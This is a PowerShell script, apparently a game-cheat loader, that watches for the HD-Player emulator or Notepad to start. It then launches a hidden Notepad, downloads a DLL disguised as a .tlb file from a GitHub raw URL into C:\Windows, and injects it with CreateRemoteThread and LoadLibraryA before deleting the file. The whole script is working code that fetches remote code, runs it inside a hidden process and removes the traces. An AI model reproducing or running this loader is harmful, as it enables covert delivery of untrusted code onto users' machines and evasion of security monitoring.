# === Constants ===
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"

$wasHdPlayerRunning = $false
$wasNotepadRunning = $false

# === Win32 API declarations ===
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

function Inject-IntoNewNotepad {
    Write-Host "[*] Launching new hidden Notepad for injection..."
    $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500

    Write-Host "[*] Downloading DLL..."
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
    } catch {
        Write-Host "[-] DLL download failed: $($_.Exception.Message)"
        return
    }

    $pid = $newProcess.Id
    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

    if ($hProcess -ne [IntPtr]::Zero) {
        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

        if ($allocMem -ne [IntPtr]::Zero) {
            $written = [IntPtr]::Zero
            $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)

            if ($wrote) {
                $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
                $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

                if ($loadLibraryAddr -ne [IntPtr]::Zero) {
                    $threadId = [IntPtr]::Zero
                    [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
                    Write-Host "[+] DLL injected successfully."
                }
            }
        }
    }

    Start-Sleep -Seconds 2
    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
}

# === Continuous Monitoring ===
while ($true) {
    $isHdPlayerRunning = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
    $isNotepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue

    $hdJustStarted = ($isHdPlayerRunning -ne $null) -and (-not $wasHdPlayerRunning)
    $notepadJustStarted = ($isNotepadRunning -ne $null) -and (-not $wasNotepadRunning)

    if ($hdJustStarted -or $notepadJustStarted) {
        Write-Host "[+] Detected new start of: " + ($(if ($hdJustStarted) { "HD-Player" } else { "Notepad" }))
        Inject-IntoNewNotepad
    }

    # Save current state for next loop
    $wasHdPlayerRunning = $isHdPlayerRunning -ne $null
    $wasNotepadRunning = $isNotepadRunning -ne $null

    Start-Sleep -Seconds 2
}
